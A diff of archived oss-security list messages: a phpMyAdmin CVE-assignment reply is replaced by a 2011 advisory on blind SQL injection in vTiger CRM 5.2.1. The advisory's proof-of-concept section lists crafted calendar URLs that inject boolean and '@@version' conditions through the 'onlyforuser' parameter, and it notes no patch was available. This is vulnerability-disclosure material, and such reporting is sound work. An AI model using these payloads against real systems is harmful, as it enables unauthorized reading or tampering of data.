@@ -1,44 +1,100 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/30/8
-Message-ID: <ab2adc9a-dfc4-466e-8687-6b1ebbd815d5@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Fri, 30 Sep 2011 13:43:00 -0400 (EDT)
-From: Josh Bressers <bressers@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/05/2
+Message-ID: <CAPYM6VyJba-ScKkmxGDD1K_n+gLfYkkrcv_gY2fUoYR6hP4SWw@mail.gmail.com>
+Date: Wed, 5 Oct 2011 18:07:12 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Cc: "Steven M. Christey" <coley@...us.mitre.org>
-Subject: Re: CVE Request --- phpMyAdmin -- Multiple XSS flaws in versions v3.4.0 to v3.4.4 (PMASA-2011-14)
+Subject: CVE Request: vTiger CRM 5.2.x <= Blind SQL Injection Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Sorry this took so long, it's been a wild couple of weeks.
+vTiger CRM 5.2.x <= Blind SQL Injection Vulnerability
 
------ Original Message -----
-> Hello Josh, Steve, vendors,
-> 
->    multiple XSS flaws have been recently reported in the v3.4.4 (and
->    earlier 3.4.X) version of phpMyAdmin (PMASA-2011-14):
-> 
-> [1] http://www.phpmyadmin.net/home_page/security/PMASA-2011-14.php
-> 
-> 1) An XSS flaw was found in the way phpMyAdmin processed row content,
-> containing JavaScript code, after its inline editing and saving,
 
-Use CVE-2011-3591
 
-> 
-> 2) It was found that phpMyAdmin did not properly sanitize the content of
-> db, table, and column names prior use of their values.
+1. OVERVIEW
 
-Use CVE-2011-3592
+The vTiger CRM 5.2.1 and lower versions are vulnerable to Blind SQL
+Injection. No fixed version has been released as of 2011-10-05.
 
-> 
-> A remote attacker could use these flaws to conduct XSS attacks (execute
-> arbitrary HTML or web script) by tricking authenticated phpMyAdmin user
-> into visiting of a specially-crafted URL.
-> 
-> References:
-> [2] http://secunia.com/advisories/45991/
-> [3] https://bugzilla.redhat.com/show_bug.cgi?id=738681
 
-Thanks.
+2. BACKGROUND
 
--- 
-    JB
+vtiger CRM is a free, full-featured, 100% Open Source CRM software
+ideal for small and medium businesses, with low-cost product support
+available to production users that need reliable support. vtiger CRM
+is a widely used product with thousands of users in dozens of
+countries.  It has a vibrant community of users driving the product
+forward, and contributing to it's development.  Over 2 million copies
+of vtiger CRM have been downloaded so far. It was launched as a fork
+of version 1.0 of the SugarCRM project launched on December 31st,
+2004.
+
+
+3. VULNERABILITY DESCRIPTION
+
+The "onlyforuser" parameter was not properly sanitized, which allows
+attacker to conduct Blind SQL Injection Attack. This could an attacker
+to inject or manipulate SQL queries in the back-end database, allowing
+for the manipulation or disclosure of arbitrary data.
+
+
+4. VERSIONS AFFECTED
+
+Tested on 5.2.1
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+A future calendar event must be created in advance to trigger this
+vulnerability.
+
+Verified with Simple 1=1 Boolean check
+-----------------------------------------------------
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+1%3d1--
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+1%3d2--
+
+
+Verified with MySQL @@version  check
+-----------------------------------------------------
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+@@version%3d5--
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+@@version%3d4--
+
+
+6. SOLUTION
+
+No patched version is available yet.
+The vendor hasn't attempted to fix the issues though they acknowledged
+the report.
+
+
+7. VENDOR
+
+vTiger Development Team
+http://www.vtiger.com/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2010-12-08: notified vendor
+2011-10-05: no fixed version released yet
+2011-10-05: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/%5BvTiger_5.2.1%5D_blind_sqlin
+Wiki VtigerCRM: https://secure.wikimedia.org/wikipedia/en/wiki/Vtiger_CRM
+
+
+#yehg [2011-10-05]
